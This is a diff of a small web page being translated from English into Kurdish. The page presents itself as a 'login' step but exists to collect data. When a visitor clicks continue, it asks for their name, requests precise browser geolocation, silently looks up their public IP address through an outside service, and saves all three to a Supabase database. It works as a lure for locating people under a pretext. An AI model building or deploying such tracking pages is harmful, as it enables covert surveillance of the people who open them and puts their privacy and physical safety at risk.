@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ku">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -45,6 +45,7 @@
 
     #result {
       margin-top: 25px;
+      line-height: 1.6;
     }
   </style>
 </head>
@@ -53,26 +54,25 @@
 
   <div class="box">
 
-    <h2>  login </h2>
+    <h2>داخڵبوون</h2>
 
-    <p>
-      This website needs your promession to continue.
-    </p>
+    <p>بۆ بەردەوامبوون، تکایە شوێنەکەت هاوبەش بکە.</p>
 
     <button id="allow">
       بەردەوام بوون
     </button>
 
     <button id="deny">
-    داخستن 
+      ڕەتکردنەوە
     </button>
 
-    <div id="result"></div>
+    <div id="result">
+      ئامادەیە...
+    </div>
 
   </div>
 
 
-  <!-- Supabase -->
   <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 
   <script>
@@ -100,39 +100,43 @@
       document.getElementById("result");
 
 
-    allowButton.addEventListener("click", async function () {
+    allowButton.addEventListener("click", function () {
 
-      const name = prompt("Enter your name:");
+      result.innerText =
+        "① دوگمەکە کار کرد...";
+
+      const name =
+        prompt("ناوی خۆت بنووسە:");
 
       if (!name || !name.trim()) {
 
         result.innerText =
-          "Please enter your name.";
-
-        return;
-      }
-
-
-      if (!navigator.geolocation) {
-
-        result.innerText =
-          "Geolocation is not supported.";
+          "❌ ناوت نەنووسیوە.";
 
         return;
       }
 
 
       result.innerText =
-        "Getting your location...";
+        "② ناو وەرگیرا. ئێستا داوای Location دەکەین...";
 
 
-      /*
-        GET LOCATION
-      */
+      if (!navigator.geolocation) {
+
+        result.innerText =
+          "❌ Browser ـەکەت Geolocation پشتگیری ناکات.";
+
+        return;
+      }
+
 
       navigator.geolocation.getCurrentPosition(
 
-        async function (position) {
+        async function(position) {
+
+          result.innerText =
+            "③ Location وەرگیرا. ئێستا Public IP دەهێنین...";
+
 
           const latitude =
             position.coords.latitude;
@@ -141,22 +145,15 @@
             position.coords.longitude;
 
 
-          result.innerText =
-            "Getting public IP...";
-
-
-          /*
-            GET PUBLIC IP
-
-            This uses a public IP service.
-          */
-
           let publicIP = null;
+
 
           try {
 
             const response =
-              await fetch("https://api.ipify.org?format=json");
+              await fetch(
+                "https://api.ipify.org?format=json"
+              );
 
             const ipData =
               await response.json();
@@ -164,23 +161,18 @@
             publicIP =
               ipData.ip;
 
-          } catch (ipError) {
+          } catch (error) {
 
-            console.error(
-              "IP Error:",
-              ipError
-            );
+            console.error(error);
 
+            result.innerText =
+              "⚠️ Location وەرگیرا، بەڵام IP نەهات. هەر دەچین بۆ Supabase.";
           }
 
 
           result.innerText =
-            "Saving your information...";
+            "④ ئێستا زانیارییەکان دەخەینە Supabase...";
 
-
-          /*
-            SAVE TO SUPABASE
-          */
 
           const { error } =
             await supabase
@@ -197,57 +189,46 @@
 
           if (error) {
 
-            console.error(
-              "Supabase Error:",
-              error
-            );
+            console.error(error);
 
             result.innerText =
-              "❌ Could not save your location.";
+              "❌ Supabase Error: " +
+              error.message;
 
             return;
           }
 
 
-          /*
-            SUCCESS
-          */
-
-          result.innerHTML = `
-            <h3>✅ Done!</h3>
-            <p>Your location was saved successfully.</p>
-          `;
+          result.innerHTML =
+            "<h3>✅ تەواو بوو!</h3>" +
+            "<p>Location بە سەرکەوتوویی هەڵگیرا.</p>";
 
         },
 
 
-        function (error) {
+        function(error) {
 
-          console.error(
-            "Location Error:",
-            error
-          );
-
+          console.error(error);
 
           if (error.code === 1) {
 
             result.innerText =
-              "❌ Location permission was denied.";
+              "❌ Location Permission ڕەتکرایەوە.";
 
           } else if (error.code === 2) {
 
             result.innerText =
-              "❌ Location is unavailable.";
+              "❌ Location بەردەست نییە.";
 
           } else if (error.code === 3) {
 
             result.innerText =
-              "❌ Location request timed out.";
+              "❌ داواکاری Location کاتی تەواو بوو.";
 
           } else {
 
             result.innerText =
-              "❌ Could not get your location.";
+              "❌ هەڵەیەک لە Location ڕوویدا.";
 
           }
 
@@ -265,10 +246,10 @@
     });
 
 
-    denyButton.addEventListener("click", function () {
+    denyButton.addEventListener("click", function() {
 
       result.innerText =
-        "Location access was not allowed.";
+        "Location ڕەتکرایەوە.";
 
     });
 
